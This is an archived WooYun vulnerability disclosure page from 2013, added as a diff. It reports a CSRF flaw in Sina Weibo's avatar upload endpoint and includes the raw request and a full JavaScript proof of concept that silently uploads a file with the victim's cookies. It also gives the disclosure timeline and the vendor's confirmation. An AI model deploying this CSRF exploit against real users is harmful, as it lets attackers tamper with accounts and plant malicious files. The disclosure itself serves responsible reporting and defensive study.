@@ -1,0 +1,359 @@
+﻿<!doctype html>
+                        <html lang="en">
+                        <head>
+	                        <meta charset="UTF-8">
+	                        <title>		利用新浪微博的csrf漏洞修改任意用户的头像  </title>
+	                        <link href="../css/css.css" rel="stylesheet" /> 
+                        </head>
+                        <body> 
+                        <ul><li>标题：		利用新浪微博的csrf漏洞修改任意用户的头像  </li><li>作者：		<a href="http://www.wooyun.org/whitehats/D＆G">D＆G</a> 
+</li><li>提交时间：		2013-11-12 16:40</li></ul>
+                        <div class="con">
+                        <h2>漏洞详情</h2>
+		<h3 class="detailTitle">披露状态：</h3>
+		<p class="detail" style="padding-bottom:0">
+					</p>
+		<p class="detail">
+									2013-11-12：	细节已通知厂商并且等待厂商处理中<br/>
+									2013-11-13：	厂商已经确认，细节仅向厂商公开<br/>
+									2013-11-23：	细节向核心白帽子及相关领域专家公开<br/>
+									2013-12-03：	细节向普通白帽子公开<br/>
+									2013-12-13：	细节向实习白帽子公开<br/>
+									2013-12-27：	细节向公众公开<br/>
+					</p>
+		<h3 class="detailTitle">简要描述：</h3>
+
+		<p class="detail">利用html5中的新特性，实现csrf无交互的上传任意文件。</p>
+
+				
+						<h3 class="detailTitle">详细说明：</h3>
+		
+			<p class="detail">新浪微博新注册用户的引导上传用户头像的接口没有防御csrf,通常的用户上传文件是需要交互,利用难度较大.不过html5有一个新特性[CORS](http://www.w3.org/TR/cors),可以实现无交互的上传文件.<br />
+<br />
+存在csrf的地方:<br />
+<br />
+</p><pre><code>POST /nguide/aj/Upload HTTP/1.1<br />
+	Host: weibo.com<br />
+	User-Agent: Mozilla/5.0 (Windows NT 5.1; rv:24.0) Gecko/20100101 Firefox/24.0<br />
+	Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8<br />
+	Accept-Language: en-gb,en;q=0.5<br />
+	Accept-Encoding: gzip, deflate<br />
+	Cookie: lang=zh-cn; UOR=www.wooyun.org<br />
+	Connection: keep-alive<br />
+	Content-Type: multipart/form-data; boundary=---------------------------246862377417659<br />
+	Content-Length: 71483<br />
+<br />
+	-----------------------------246862377417659<br />
+	Content-Disposition: form-data; name=&quot;filedata&quot;; filename=&quot;Sunset.jpg&quot;<br />
+	Content-Type: image/jpeg</code></pre><p class='detail'><br />
+<br />
+	<br />
+<br />
+<br />
+<br />
+话说有个疑问,为什么我的cookie里会有www.wooyun.org这个字段?????<br />
+<br />
+<br />
+<br />
+<br />
+<br />
+这个地方的post请求既没有token,也没对refer进行验证.<br />
+<br />
+所以构造如下poc<br />
+<br />
+</p><pre><code>&lt;!DOCTYPE html&gt; <br />
+	&lt;html&gt; <br />
+	&lt;head&gt;<br />
+	&lt;meta charset=utf-8 /&gt;<br />
+	&lt;link href=&#039;http://fonts.googleapis.com/css?family=Inconsolata&#039; rel=&#039;stylesheet&#039; type=&#039;text/css&#039;&gt; <br />
+	&lt;script src=&quot;http://ajax.googleapis.com/ajax/libs/jquery/1.5.2/jquery.min.js&quot; type=&quot;text/javascript&quot;&gt;&lt;/script&gt;<br />
+	&lt;style&gt;<br />
+	body {background: #333; color: #eee; font-family: &#039;Inconsolata&#039;, Verdana, sans-serif;}<br />
+	a:link {color: green; }<br />
+	a:visited {color: darkgreen;}<br />
+	&lt;/style&gt;<br />
+	&lt;/head&gt;<br />
+	&lt;body&gt;<br />
+	&lt;h1&gt;sina weibo CSRF arbitrary file upload&lt;/h1&gt;<br />
+<br />
+	&lt;h2&gt;Step 1&lt;/h2&gt;<br />
+	Log in into &lt;a href=&quot;http://weibo.com&quot;&gt;weibo.com&lt;/a&gt; (skip this if you use &#039;remember me&#039; feature)<br />
+	&lt;h2&gt;Step 2&lt;/h2&gt;<br />
+	&lt;button type=&quot;button&quot; id=&quot;upload&quot; onclick=&quot;start()&quot;&gt;&lt;font size=&quot;+2&quot;&gt;Let&#039;s have some fun!&lt;/font&gt;&lt;/button&gt;<br />
+	&lt;script&gt;<br />
+	var logUrl = &#039;http://weibo.com/nguide/aj/Upload/&#039;;<br />
+<br />
+	function byteValue(x) {<br />
+    return x.charCodeAt(0) &amp; 0xff;<br />
+	}<br />
+<br />
+	function toBytes(datastr) {<br />
+    var ords = Array.prototype.map.call(datastr, byteValue);<br />
+    var ui8a = new Uint8Array(ords);<br />
+    return ui8a.buffer;<br />
+	}<br />
+<br />
+	if (typeof XMLHttpRequest.prototype.sendAsBinary == &#039;undefined&#039; &amp;&amp; Uint8Array) {<br />
+	XMLHttpRequest.prototype.sendAsBinary = function(datastr) {<br />
+	this.send(toBytes(datastr));<br />
+	}<br />
+	}<br />
+<br />
+	function fileUpload(fileData, fileName) {<br />
+	var fileSize = fileData.length,<br />
+	boundary = &quot;9849436581144108930470211272&quot;,<br />
+	uri = logUrl,<br />
+	xhr = new XMLHttpRequest();<br />
+<br />
+	var additionalFields = {<br />
+	rawpic: 1<br />
+	}<br />
+<br />
+	var fileFieldName = &quot;filedata&quot;;<br />
+	<br />
+	xhr.open(&quot;POST&quot;, uri, true);<br />
+	xhr.setRequestHeader(&quot;Content-Type&quot;, &quot;multipart/form-data, boundary=&quot;+boundary); // simulate a file MIME POST request.<br />
+	xhr.setRequestHeader(&quot;Content-Length&quot;, fileSize);<br />
+	xhr.withCredentials = &quot;true&quot;;<br />
+	<br />
+	xhr.onreadystatechange = function() {<br />
+	if (xhr.readyState == 4) {<br />
+	if ((xhr.status &gt;= 200 &amp;&amp; xhr.status &lt;= 200) || xhr.status == 304) {<br />
+	<br />
+	if (xhr.responseText != &quot;&quot;) {<br />
+	alert(JSON.parse(xhr.responseText).msg); // display response.<br />
+	}<br />
+	} else if (xhr.status == 0) {<br />
+	$(&quot;#goto&quot;).show();<br />
+	}<br />
+	}<br />
+	}<br />
+	<br />
+	var body = &quot;&quot;;<br />
+	<br />
+	for (var i in additionalFields) {<br />
+	if (additionalFields.hasOwnProperty(i)) {<br />
+	body += addField(i, additionalFields[i], boundary);<br />
+	}<br />
+	}<br />
+<br />
+	body += addFileField(fileFieldName, fileData, fileName, boundary);<br />
+	body += &quot;--&quot; + boundary + &quot;--&quot;;<br />
+	xhr.sendAsBinary(body);<br />
+	return true;<br />
+	}<br />
+<br />
+	function addField(name, value, boundary) {<br />
+	var c = &quot;--&quot; + boundary + &quot;\r\n&quot;<br />
+	c += &quot;Content-Disposition: form-data; name=&#039;&quot; + name + &quot;&#039;\r\n\r\n&quot;;<br />
+	c += value + &quot;\r\n&quot;;<br />
+	return c;<br />
+	}<br />
+<br />
+	function addFileField(name, value, filename, boundary) {<br />
+    var c = &quot;--&quot; + boundary + &quot;\r\n&quot;<br />
+    c += &quot;Content-Disposition: form-data; name=&#039;&quot; + name + &quot;&#039;; filename=&#039;&quot; + filename + &quot;&#039;\r\n&quot;;<br />
+    c += &quot;Content-Type: image/jpeg\r\n\r\n&quot;;<br />
+    c += value + &quot;\r\n&quot;;<br />
+    return c;	<br />
+	}<br />
+<br />
+	function load_binary_resource(url) {<br />
+	var req = new XMLHttpRequest();<br />
+	req.open(&#039;GET&#039;, url, false);<br />
+	//XHR binary charset opt by Marcus Granado 2006 [http://mgran.blogspot.com]<br />
+	req.overrideMimeType(&#039;text/plain; charset=x-user-defined&#039;);<br />
+	req.send(null);<br />
+	if (req.status != 200) return &#039;&#039;;<br />
+	var bytes = Array.prototype.map.call(req.responseText, byteValue);<br />
+	return String.fromCharCode.apply(this, bytes);<br />
+	return req.responseText;<br />
+	}<br />
+<br />
+	var start = function() {<br />
+	var c = load_binary_resource(&#039;html5.jpg&#039;);<br />
+	fileUpload(c, &#039;html5.jpg&#039;);<br />
+	};<br />
+	//start();<br />
+<br />
+	&lt;/script&gt;<br />
+	&lt;/div&gt;<br />
+	&lt;div id=&quot;goto&quot; style=&quot;display:none&quot;&gt;<br />
+	&lt;h2&gt;Step 3&lt;/h2&gt;<br />
+	Done! &lt;a href=&quot;http://weibo.com&quot;&gt;see for yourself!&lt;/a&gt;<br />
+	&lt;/div&gt;<br />
+	&lt;/body&gt;<br />
+	&lt;/html&gt;</code></pre><p class='detail'><br />
+<br />
+测试浏览器:firefox24.0<br />
+<br />
+<br />
+<br />
+当前用户的头像为:<br />
+<br />
+</p><p class="detail"><a href="../images/1216154861d317de1cd08fc5cfa26cd45c123147.png" target="_blank"><img src="../images/1216154861d317de1cd08fc5cfa26cd45c123147.png" alt="sina1.png" width="600"/></a></p><p class="detail"><br />
+<br />
+访问poc<br />
+<br />
+</p><p class="detail"><a href="../images/1216193245a5ef99914ff7f02ea94ad36f5ef45e.png" target="_blank"><img src="../images/1216193245a5ef99914ff7f02ea94ad36f5ef45e.png" alt="sina2.png" width="600"/></a></p><p class="detail"><br />
+<br />
+点击havefun。当然，js是可以自动提交的。这里仅仅是演示。<br />
+<br />
+查看头像已经被修改了<br />
+<br />
+</p><p class="detail"><a href="../images/12162119fd29f3f141092f99a6578fa58f97f140.png" target="_blank"><img src="../images/12162119fd29f3f141092f99a6578fa58f97f140.png" alt="sina3.png" width="600"/></a></p><p class="detail"><br />
+<br />
+<br />
+<br />
+ </p>
+				
+									<h3 class="detailTitle">漏洞证明：</h3>
+
+			<p class="detail">当前用户的头像为:<br />
+<br />
+</p><p class="detail"><a href="../images/1216154861d317de1cd08fc5cfa26cd45c123147.png" target="_blank"><img src="../images/1216154861d317de1cd08fc5cfa26cd45c123147.png" alt="sina1.png" width="600"/></a></p><p class="detail"><br />
+<br />
+访问poc<br />
+<br />
+</p><p class="detail"><a href="../images/1216193245a5ef99914ff7f02ea94ad36f5ef45e.png" target="_blank"><img src="../images/1216193245a5ef99914ff7f02ea94ad36f5ef45e.png" alt="sina2.png" width="600"/></a></p><p class="detail"><br />
+<br />
+点击havefun。当然，js是可以自动提交的。这里仅仅是演示。<br />
+<br />
+查看头像已经被修改了<br />
+<br />
+</p><p class="detail"><a href="../images/12162119fd29f3f141092f99a6578fa58f97f140.png" target="_blank"><img src="../images/12162119fd29f3f141092f99a6578fa58f97f140.png" alt="sina3.png" width="600"/></a></p><p class="detail"><br />
+<br />
+ </p>
+
+									<h3 class="detailTitle">修复方案：</h3>
+			<p class="detail">也许黑帽子才更懂得每一个漏洞每一缺陷的利用价值。<br />
+<br />
+防御csrf即可。<br />
+<br />
+举一反三多查找一下上传文件是否防御了csrf，不仅仅是传个头像，比如分享文件啊这些点。可以传播恶意文件。 </p>
+										<h3 class="detailTitle">版权声明：转载请注明来源 <a style="font-weight:normal" href="http://www.wooyun.org/whitehats/D＆G" title="D＆G">D＆G</a>@<a style="font-weight:normal" href="http://www.wooyun.org/bugs/wooyun-2010-042688" title="利用新浪微博的csrf漏洞修改任意用户的头像">乌云</a></h3>
+		<hr align="center"/>
+
+				
+			<h2>漏洞回应</h2>
+			
+			
+															<h3 class="detailTitle">厂商回应：</h3>
+						<p class="detail">危害等级：中</p>
+						<p class="detail">漏洞Rank：7 </p>
+													<p class="detail">确认时间：2013-11-13 11:19</p>
+												<h3 class="detailTitle">厂商回复：</h3>				
+						<p class="detail">感谢关注新浪安全，马上安排相关人员修复</p>
+					
+
+					
+					
+					<h3 class="detailTitle">最新状态：</h3>
+
+											<p class="detail">暂无</p>
+					
+
+							
+					
+		
+<hr align="center" />
+<script type="text/javascript">
+var bugid="42688";
+var bugRating="-3";
+var myRating="";
+var ratingCount="0";
+
+
+
+function ShowBugRating(k){
+	var ratingItems=$(".myrating span");
+	$.each(ratingItems,function(i,n){
+		var nk=parseInt($(n).attr("rel"));
+		if(nk<=k){
+			$(n).addClass("on");
+		}else{
+			$(n).removeClass("on");
+		}
+	});
+	$(".myrating span").hover(
+		function(){
+			$("#ratingShow").html($(this).attr("data-title"));
+		},
+		function(){
+			$("#ratingShow").html("");
+		}
+	);
+}
+$(document).ready(function(){
+	if(myRating==""){
+		var ratingItems=$(".myrating span");
+		$(".myrating span").hover(
+			function(){
+				$(this).addClass("hover");
+				var k=parseInt($(this).attr("rel"));
+				$.each(ratingItems,function(i,n){
+					var nk=parseInt($(n).attr("rel"));
+					if(nk<k) $(n).addClass("on");
+					if(nk>k) $(n).removeClass("on");
+				});
+				$("#ratingShow").html($(this).attr("data-title"));
+			},
+			function(){
+				$(this).removeClass("hover");
+				if($("#myRating").val()==""){
+					$.each(ratingItems,function(i,n){
+						$(n).removeClass("on");
+					});
+				}
+				$("#ratingShow").html("");
+			}
+		);
+
+		$(".myrating span").click(function(){
+			var rating=$(this).attr("rel");
+			var k=parseInt($(this).attr("rel"));
+			$.post("/ajaxdo.php?module=bugrating",{"id":bugid,"rating":rating,"token":$("#token").val()},function(re){
+				//消除操作绑定
+				$(".myrating span").unbind();
+				re=parseInt(re);
+				switch(re){
+					case 1:
+						$("#ratingShow").html("评分成功");
+						$("#ratingSpan").html(parseInt($("#ratingSpan").html())+1);
+						$.each(ratingItems,function(i,n){
+							var nk=parseInt($(n).attr("rel"));
+							if(nk<=k){
+								$(n).addClass("on");
+							}else{
+								$(n).removeClass("on");
+							}
+						});
+						ShowBugRating(rating);
+						break;
+					case 2:
+						$("#ratingShow").html("请先登录");
+						break;
+					case 4:
+						$("#ratingShow").html("已对此漏洞进行过评分");
+						break;
+					case 6:
+						$("#ratingShow").html("不能对自己发布的漏洞进行评分");
+						break;
+					default:break;
+				}
+			});
+		});
+	}else{
+		if(ratingCount>2){
+			ShowBugRating(bugRating);
+		}else{
+			ShowBugRating(-3);
+		}
+	}
+});
+
+</script>
+<h3 class="detailTitle">漏洞评价：</h3>
+                        </div>
+                        </body>
+                        </html>
